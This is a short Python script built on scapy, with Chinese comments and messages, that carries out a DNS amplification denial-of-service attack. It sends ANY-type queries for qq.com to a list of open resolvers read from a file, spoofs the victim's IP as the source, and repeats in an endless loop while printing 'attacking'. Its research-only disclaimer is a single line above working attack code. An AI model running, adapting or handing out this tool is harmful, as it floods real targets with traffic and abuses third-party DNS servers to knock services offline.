import time
import random
import sys
import os
try:
    from scapy.all import *
except:
    print("请使用cmd或者终端安装scapy ")
    print("尝试使用pip install scapy来安装模块")
#本工具仅供研究参考，非经授权，请勿用作其他任何用途
def read(ip,port,dnsid,fake_ttl):
    dns_list=[]
    with open('dns.txt','r') as f:
        ff = f.readlines()
        for i in ff:
            i = i.rstrip("\n")
            dns_list.append(i)
    lenth = (len(dns_list)-1)
    while True:
        seq=random.randint(0,lenth)
        dnsip = dns_list[seq]
        crate(dnsip,ip,port,dnsid,fake_ttl)
def crate(dnsip,ip,port,dnsid,fake_ttl):
    dnsip = str(dnsip)
    ip = str(ip)
    port = int(port)
    dnsid = int(dnsid)
    fake_ttl = int(fake_ttl)
    dns_query=IP(dst=dnsip,src=ip,ttl=fake_ttl)/UDP(dport=53)/DNS(id=dnsid,qd=DNSQR(qname="qq.com",qtype=255))
    print('正在攻击ing·····')
    send(dns_query)
if __name__ == '__main__':
    try:
        ip = sys.argv[1]
        port = sys.argv[2]
        dnsid = random.randint(0,255)
        fake_ttl = random.randint(120,128)
        read(ip,port,dnsid,fake_ttl)
        time.sleep(0.5)
    except IndexError:
        print("你一定还不会用吧？")
        print("cmd下：python dns_attack.py [攻击的IP] [目标端口] ")